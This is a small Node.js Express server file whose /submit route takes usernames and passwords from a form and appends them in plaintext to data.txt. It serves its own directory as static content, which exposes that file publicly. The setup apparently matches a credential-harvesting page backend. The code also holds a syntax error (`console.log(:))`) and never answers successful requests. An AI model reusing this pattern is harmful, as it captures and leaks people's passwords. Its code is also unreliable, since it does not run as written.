const express = require('express');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');
const app = express();
const port = process.env.PORT || 3000;

// Middleware to serve static files and parse request body
app.use(express.static(__dirname));
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/submit', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    const data = `Username: ${username}\nPassword: ${password}\n\n`;

    // Append the data to a file
    fs.appendFile('data.txt', data, (err) => {
        if (err) {
            console.error('Error writing to file', err);
            res.status(500).send('Internal Server Error');
        } else {
            console.log(:));
        }
    });
});

app.listen(port, () => {
    console.log(`Example app listening on port ${port}`);
});
